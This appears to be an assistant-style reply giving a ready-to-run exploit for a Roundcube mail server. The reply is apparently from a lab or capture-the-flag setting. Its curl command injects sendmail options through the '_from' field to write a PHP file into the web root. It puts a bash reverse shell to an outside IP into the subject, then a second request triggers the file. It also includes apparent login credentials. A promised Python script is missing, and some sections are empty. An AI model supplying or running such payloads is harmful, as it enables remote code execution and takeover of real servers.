Here's the complete exploit payload. This uses the same Roundcube _from injection techniqu.
    
Python script — save and run:    
    
Or if you want a one-liner to manually trigger after login:
Once you have the compose_id and token from logging into Roundcube, the curl equivalent is:
    
Replace COMPOSE_ID and TOKEN with values from the compose page
curl -s -u 'user:password' \
      -X POST 'http://192.168.120.81/zmail/' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'X-Requested-With: XMLHttpRequest' \
      --data-urlencode '_token=TOKEN' \
      --data-urlencode '_task=mail' \
      --data-urlencode '_action=send' \
      --data-urlencode '_id=COMPOSE_ID' \
      --data-urlencode '_from=p48@localhost -OQueueDirectory=/tmp -X/var/www/html/zmail/rs.php' \
      --data-urlencode '_subject=<?php system("bash -c \"exec bash -i >&/dev/tcp/192.168.45.200/9898 <&1\""); ?>' \
      --data-urlencode '_message=pwn' \
      --data-urlencode '_framed=1' \
      --max-time 5 2>/dev/null
    
Then trigger:
curl -s -u 'p48:electrico' 'http://192.168.120.81/zmail/rs.php' --max-time 2 2>/dev/null
